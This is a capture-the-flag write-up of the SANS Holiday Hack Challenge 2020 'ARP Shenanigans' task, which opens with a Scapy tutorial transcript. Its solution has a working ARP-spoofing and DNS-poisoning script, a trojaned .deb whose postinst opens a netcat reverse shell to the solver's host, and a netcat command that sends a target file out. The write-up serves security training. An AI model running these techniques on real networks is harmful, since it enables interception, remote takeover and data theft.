# Writeup for SANS Holiday Hack Challenge 2020 - 'Zat You, Santa Claus? featuring KringleCon 3: French Hens
# 9. ARP Shenanigans
## 9.0. Description
Go to the NetWars room on the roof and help Alabaster Snowball get access back to a host using ARP. Retrieve the document at /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt. Who recused herself from the vote described on the document?

## 9.1. Side Challenge - Scapy Prepper
Below an extraction of all commands executed:
```bash
#╔════════════════════════════════════════════════════════════════╗
#║  ___ ___ ___ ___ ___ _  _ _____   ___  _   ___ _  _____ _____  ║
#║ | _ \ _ \ __/ __| __| \| |_   _| | _ \/_\ / __| |/ / __|_   _| ║
#║ |  _/   / _|\__ \ _|| .` | | |   |  _/ _ \ (__| ' <| _|  | |   ║
#║ |_| |_|_\___|___/___|_|\_| |_|   |_|/_/ \_\___|_|\_\___| |_|   ║
#║                ___                                             ║
#║               | _ \_ _ ___ _ __ _ __  ___ _ _                  ║
#║               |  _/ '_/ -_) '_ \ '_ \/ -_) '_|                 ║
#║               |_| |_| \___| .__/ .__/\___|_|                   ║
#║                           |_|  |_|                             ║
#║                (Packets prepared with scapy)                   ║
#╚════════════════════════════════════════════════════════════════╝
#Type "yes" to begin. yes
#╔════════════════════════════════════════════════════════════════╗
#║ HELP MENU:                                                     ║
#╠════════════════════════════════════════════════════════════════╣
#║ 'help()' prints the present packet scapy help.                 ║
#║ 'help_menu()' prints the present packet scapy help.            ║
#║ 'task.get()' prints the current task to be solved.             ║
#║ 'task.task()' prints the current task to be solved.            ║
#║ 'task.help()' prints help on how to complete your task         ║
#║ 'task.submit(answer)' submit an answer to the current task     ║
#║ 'task.answered()' print through all successfully answered.     ║
#╚════════════════════════════════════════════════════════════════╝
>>> task.get()
Welcome to the "Present Packet Prepper" interface! The North Pole could use your help preparing present packets for shipment.
Start by running the task.submit() function passing in a string argument of 'start'.
Type task.help() for help on this question.
>>> task.submit('start')
Correct! adding a () to a function or class will execute it. Ex - FunctionExecuted()

Submit the class object of the scapy module that sends packets at layer 3 of the OSI model.
>>> task.submit(send)
Correct! The "send" scapy class will send a crafted scapy packet out of a network interface.

Submit the class object of the scapy module that sniffs network packets and returns those packets in a list.

>>> task.submit(sniff)
Correct! the "sniff" scapy class will sniff network traffic and return these packets in a list.

Submit the NUMBER only from the choices below that would successfully send a TCP packet and then return the first sniffed response packet to be stored in a variable named "pkt":
1. pkt = sr1(IP(dst="127.0.0.1")/TCP(dport=20))
2. pkt = sniff(IP(dst="127.0.0.1")/TCP(dport=20))
3. pkt = sendp(IP(dst="127.0.0.1")/TCP(dport=20))
>>> task.submit(1)
Correct! sr1 will send a packet, then immediately sniff for a response packet.

Submit the class object of the scapy module that can read pcap or pcapng files and return a list of packets.
>>> task.submit(rdpcap)
Correct! the "rdpcap" scapy class can read pcap files.

The variable UDP_PACKETS contains a list of UDP packets. Submit the NUMBER only from the choices below that correctly prints a summary of UDP_PACKETS:
1. UDP_PACKETS.print()
2. UDP_PACKETS.show()
3. UDP_PACKETS.list()
>>> task.submit(2)
Correct! .show() can be used on lists of packets AND on an individual packet.

Submit only the first packet found in UDP_PACKETS.
>>> task.submit(UDP_PACKETS[0])
Correct! Scapy packet lists work just like regular python lists so packets can be accessed by their position in the list starting at offset 0.

Submit only the entire TCP layer of the second packet in TCP_PACKETS.
>>> task.submit(TCP_PACKETS[1][TCP])
Correct! Most of the major fields like Ether, IP, TCP, UDP, ICMP, DNS, DNSQR, DNSRR, Raw, etc... can be accessed this way. Ex - pkt[IP][TCP]

Change the source IP address of the first packet found in UDP_PACKETS to 127.0.0.1 and then submit this modified packet
>>> task.submit(Ether(dst='00:c0:9f:32:41:8c', src='00:e0:18:b1:0c:ad', type='IPv4') / IP (version='4', ihl='5', tos='0x0', len='60', id='0', flags='DF', frag='0', ttl='64', proto='udp', chksum='0x6543', src='127.0.0.1', dst='192.168.170.20') / UDP(sport='32795', dport='domain', len='40', chksum='0xaf61') / DNS(id='30144', qr='0', opcode='QUERY', aa='0', tc='0', rd='1', ra='0', z='0', ad='0', cd='0', rcode='ok', qdcount='1', ancount='0', nscount='0', arcount='0', qd=DNSQR(qname='www.elves.rule.', qtype='A', qclass='IN'), an='None', ns='None', ar='None'))
Correct! You can change ALL scapy packet attributes using this method.

Submit the password "task.submit('elf_password')" of the user alabaster as found in the packet list TCP_PACKETS.
>>> TCP_PACKETS[7].payload
<IP  version=4 ihl=5 tos=0x0 len=70 id=10595 flags=DF frag=0 ttl=128 proto=tcp chksum=0x4ecb src=192.168.0.193 dst=192.168.0.114 |<TCP  sport=ftp dport=1137 seq=3334930821 ack=3753095961 dataofs=5 reserved=0 flags=PA window=65509 chksum=0xd3 urgptr=0 |<Raw  load='230 User alabaster logged in.\r' |>>>
>>> TCP_PACKETS[6][Raw]
<Raw  load='PASS echo\r\n' |>

>>> TCP_PACKETS[5][Raw]
<Raw  load='331 Password required for alabaster.\r' |>

>>> TCP_PACKETS[4][Raw]
<Raw  load='USER alabaster\r' |>

>>> TCP_PACKETS[3][Raw]
<Raw  load='220 North Pole FTP Server\r\n' |>

>>> task.submit('echo')
Correct! Here is some really nice list comprehension that will grab all the raw payloads from tcp packets:
[pkt[Raw].load for pkt in TCP_PACKETS if Raw in pkt]
The ICMP_PACKETS variable contains a packet list of several icmp echo-request and icmp echo-reply packets. Submit only the ICMP chksum value from the second packet in the ICMP_PACKETS list.

>>> task.submit(ICMP_PACKETS[1][ICMP].chksum)
Correct! You can access the ICMP chksum value from the second packet using ICMP_PACKETS[1][ICMP].chksum .

Submit the number of the choice below that would correctly create a ICMP echo request packet with a destination IP of 127.0.0.1 stored in the variable named "pkt"
1. pkt = Ether(src='127.0.0.1')/ICMP(type="echo-request")
2. pkt = IP(src='127.0.0.1')/ICMP(type="echo-reply")
3. pkt = IP(dst='127.0.0.1')/ICMP(type="echo-request")
>>> task.submit(3)
Correct! Once you assign the packet to a variable named "pkt" you can then use that variable to send or manipulate your created packet.

Create and then submit a UDP packet with a dport of 5000 and a dst IP of 127.127.127.127. (all other packet attributes can be unspecified)
>>> task.submit(IP(dst='127.127.127.127')/UDP(dport=5000))
Correct! Your UDP packet creation should look something like this:
pkt = IP(dst="127.127.127.127")/UDP(dport=5000)
task.submit(pkt)

Create and then submit a UDP packet with a dport of 53, a dst IP of 127.2.3.4, and is a DNS query with a qname of "elveslove.santa". (all other packet attributes can be unspecified)
>>> task.submit(IP (dst='127.2.3.4') / UDP(dport=53) / DNS(qd=DNSQR(qname='elveslove.santa')))
Correct! Your UDP packet creation should look something like this:
pkt = IP(dst="127.2.3.4")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="elveslove.santa"))
task.submit(pkt)

The variable ARP_PACKETS contains an ARP request and response packets. The ARP response (the second packet) has 3 incorrect fields in the ARP layer. Correct the second packet in ARP_PACKETS to be a proper ARP response and then task.submit(ARP_PACKETS) for inspection.

>>> ARP_PACKETS[1][ARP].hwsrc='00:13:46:0b:22:ba'

>>> ARP_PACKETS[1][ARP].hwdst='00:16:ce:6e:8b:24'

>>> ARP_PACKETS[1][ARP].op='is-at'
>>> task.submit(ARP_PACKETS)
Great, you prepared all the present packets!

Congratulations, all pretty present packets properly prepared for processing!
```

## 9.2. Hints
> **Embedy** - Alabaster Snowball: *“The malware on the host does an HTTP request for a .deb package. Maybe we can get command line access by sending it a command in a customized .deb file”*  
> **Spoofy** - Alabaster Snowball: *“The host is performing an ARP request. Perhaps we could do a spoof to perform a machine-in-the-middle attack. I think we have some sample scapy traffic scripts that could help you in /home/guest/scripts.”*  
> **Resolvy** - Alabaster Snowball: *“Hmmm, looks like the host does a DNS request after you successfully do an ARP spoof. Let's return a DNS response resolving the request to our IP.”*  
> **Sniffy** - Alabaster Snowball: *“Jack Frost must have gotten malware on our host at 10.6.6.35 because we can no longer access it. Try sniffing the eth0 interface using tcpdump -nni eth0 to see if you can view any traffic from that host.”*

## 9.3. Solution
For the ARP spoofing and DNS poisoning part I merged the suggested scripts into one and ensure it would manage all incoming ARP & DNS packets so to be consistent over time:
```python
from scapy.all import *
import netifaces as ni
import uuid

ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])

def handle_packets(packet):
   if ARP in packet and packet[ARP].op == 1:
      ether_resp = Ether(dst=packet[Ether].src, type=0x806, src=macaddr)
      arp_response = ARP(pdst=packet[ARP].pdst)
      arp_response.op = 2
      arp_response.plen = 4
      arp_response.hwlen = 6
      arp_response.ptype = 0x0800
      arp_response.hwtype = 1
      arp_response.hwsrc = macaddr
      arp_response.psrc = packet[ARP].pdst
      arp_response.hwdst = packet[ARP].hwsrc
      arp_response.pdst = packet[ARP].psrc
      response = ether_resp/arp_response
      sendp(response, iface="eth0")
   elif DNS in packet and packet[DNS].opcode == 0:
      ether_resp = Ether(dst=packet[Ether].src, type="IPv4", src=macaddr)
      ip_resp = IP(proto="udp", src=packet[IP].dst, dst=packet[IP].src)
      udp_resp = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)
      dns_response=packet[DNS]
      dns_response.qr=1
      dns_response.ancount=1
      dns_response.an=DNSRR(rrname=packet[DNS].qd.qname, type='A', rclass='IN', rdata=ipaddr)
      response = ether_resp/ip_resp/udp_resp/dns_response
      sendp(response, iface="eth0")
      
while 1:
   sniff(prn=handle_packets, store=0)
```
I kept the script running with the below shell command:
```bash
guest@3944f7bc1eff:~/debs/work$ python3 sol.py>/dev/null &
```
I then ran the HTTP server with `python -m http.server 80` but I was getting permission denied errors sometimes, when it worked I could noticed incoming GET requests for `/pub/jfrost/backdoor/suriv_amd64.deb`:
```bash
guest@3944f7bc1eff:~/debs/work$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.6.6.35 - - [29/Dec/2020 00:20:08] code 404, message File not found
10.6.6.35 - - [29/Dec/2020 00:20:08] "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1" 404 -
```
Knowing the URL of the file being requested I repackaged one of the deb file in the debs folder making it establish a reverse shell to the machine I was using:
```bash
guest@3944f7bc1eff:~/debs$ dpkg -x netcat-traditional_1.10-41.1ubuntu1_amd64.deb netcat
guest@3944f7bc1eff:~/debs/netcat/DEBIAN$ cat control 
Package:suriv
Version:1.0
Architecture:amd64
Maintainer:anche-no
Description:ma-anche-no
guest@3944f7bc1eff:~/debs/netcat/DEBIAN$ cat postinst 
nc -e /bin/sh 10.6.0.2 4242
guest@3944f7bc1eff:~/debs$ chmod 775 netcat/DEBIAN/postinst 
guest@3944f7bc1eff:~/debs$ dpkg --build netcat
dpkg-deb: building package 'suriv' in 'netcat.deb'.
guest@3944f7bc1eff:~/debs$ mv netcat.deb suriv_amd64.deb
Rerunning the web server with a proper directory structure did the trick and I was able to establish the connection to the remote end, getting to know more the target file:
guest@3944f7bc1eff:~/debs$ mkdir -p ~/web/pub/jfrost/backdoor/
guest@3944f7bc1eff:~/debs$ cp suriv_amd64.deb ~/web/pub/jfrost/backdoor/
guest@3944f7bc1eff:~/web$ python3 -m http.server 80 2> /dev/null 1 > /dev/null &
guest@3944f7bc1eff:~/web$ nc -l -v -p 4242
listening on [any] 4242 ...
connect to [10.6.0.2] from arp_requester.guestnet0.kringlecastle.com [10.6.6.35] 52832
whoami
jfrost

pwd
/

ls
NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```
I then changed the tampered deb file and made it copy out the file to the machine i was using with netcat:
```bash
guest@3944f7bc1eff:~/debs/netcat/DEBIAN$ cat postinst 
nc -w 3 10.6.0.2 4242 < /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt
```
Once the remote end reconnected i got the target file:
```bash
guest@3944f7bc1eff:~$ nc -l -p 4242 > NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt
```
Reading through the file pointed out that Tanta Kringle recused herself from the vote.
```
Meeting Location: All gathered in North Pole Municipal Building, 1 Santa Claus Ln, North Pole

Chairman Frost calls meeting to order at 7:30 PM North Pole Standard Time.

Roll call of Board members please:
Chairman Jack Frost - Present
Vice Chairman Mother Nature - Present

Superman - Present
Clarice - Present
Yukon Cornelius - HERE!
Ginger Breaddie - Present
King Moonracer - Present
Mrs. Donner - Present
Tanta Kringle - Present
Charlie In-the-Box - Here
Krampus - Growl
Dolly - Present
Snow Miser - Heya!
Alabaster Snowball - Hello
Queen of the Winter Spirits - Present

ALSO PRESENT:
                Kris Kringle
                Pepper Minstix
                Heat Miser
                Father Time

Chairman Frost made the required announcement concerning the Open Public Meetings Act: Adequate notice of this meeting has been made -- displayed on the bulletin board next to the Pole, listed on the North Pole community website, and published in the North Pole Times newspaper -- for people who are interested in this meeting.

Review minutes for December 2020 meeting. Motion to accept – Mrs. Donner. Second – Superman.  Minutes approved.

OLD BUSINESS: No Old Business.

RESOLUTIONS:
The board took up final discussions of the plans presented last year for the expansion of Santa’s Castle to include new courtyard, additional floors, elevator, roughly tripling the size of the current castle.  Architect Ms. Pepper reviewed the planned changes and engineering reports. Chairman Frost noted, “These changes will put a heavy toll on the infrastructure of the North Pole.”  Mr. Krampus replied, “The infrastructure has already been expanded to handle it quite easily.”  Chairman Frost then noted, “But the additional traffic will be a burden on local residents.”  Dolly explained traffic projections were all in alignment with existing roadways.  Chairman Frost then exclaimed, “But with all the attention focused on Santa and his castle, how will people ever come to refer to the North Pole as ‘The Frostiest Place on Earth?’”  Mr. In-the-Box pointed out that new tourist-friendly taglines are always under consideration by the North Pole Chamber of Commerce, and are not a matter for this Board.  Mrs. Nature made a motion to approve.  Seconded by Mr. Cornelius.  Tanta Kringle recused herself from the vote given her adoption of Kris Kringle as a son early in his life.  

Approved:
Mother Nature
Superman
Clarice
Yukon Cornelius
Ginger Breaddie
King Moonracer
Mrs. Donner
Charlie In the Box
Krampus
Dolly
Snow Miser
Alabaster Snowball
Queen of the Winter Spirits

Opposed: 
                Jack Frost

Resolution carries.  Construction approved.

NEW BUSINESS:

Father Time Castle, new oversized furnace to be installed by Heat Miser Furnace, Inc.  Mr. H. Miser described the plan for installing new furnace to replace the faltering one in Mr. Time’s 20,000 sq ft castle. Ms. G. Breaddie pointed out that the proposed new furnace is 900,000,000 BTUs, a figure she considers “incredibly high for a building that size, likely two orders of magnitude too high.  Why, it might burn the whole North Pole down!”  Mr. H. Miser replied with a laugh, “That’s the whole point!”  The board voted unanimously to reject the initial proposal, recommending that Mr. Miser devise a more realistic and safe plan for Mr. Time’s castle heating system.


Motion to adjourn – So moved, Krampus.  Second – Clarice. All in favor – aye. None opposed, although Chairman Frost made another note of his strong disagreement with the approval of the Kringle Castle expansion plan.  Meeting adjourned.
```
## 9.4. Special thanks
Thanks to the partly-uuid bud on Discord who had the patience to make me notice there was a readme file which I completely overlooked. Shame on me for not being able to start the web server at the first shot 😁  
![readme](imgs/00_readme.png)


---
# 10. [Defeat Fingerprint Sensor](../10.%20Defeat%20Fingerprint%20Sensor/README.md)
# 11a. [Naughty/Nice List with Blockchain Investigation Part 1](../11a.%20Naughty-Nice%20List%20with%20Blockchain%20Investigation%20Part%201/README.md)
# 11b. [Naughty/Nice List with Blockchain Investigation Part 2](../11b.%20Naughty-Nice%20List%20with%20Blockchain%20Investigation%20Part%202/README.md)

---
# 0. [thedead@asian:~$ whoami](../README.md)
# ?. [33.6 Kbps](../%20%3F.%2033.6%20Kbps/README.md)
# 1. [Uncover Santa's Gift List](../01.%20Uncover%20Santa's%20Gift%20List/README.md)
# 2. [Investigate S3 Bucket](../02.%20Investigate%20S3%20Bucket/README.md)
# 3. [Point-of-Sale Password Recovery](../03.%20Point-of-Sale%20Password%20Recovery/README.md)
# 4. [Operate the Santavator](../04.%20Operate%20the%20Santavator/README.md)
# 5. [Open HID Lock](../05.%20Open%20HID%20Lock/README.md)
# 6. [Splunk Challenge](../06.%20Splunk%20Challenge/README.md)
# 7. [Solve the Sleigh's CAN-D-BUS Problem](../07.%20Solve%20the%20Sleigh's%20CAN-D-BUS%20Problem/README.md)
# 8. [Broken Tag Generator](../08.%20Broken%20Tag%20Generator/README.md)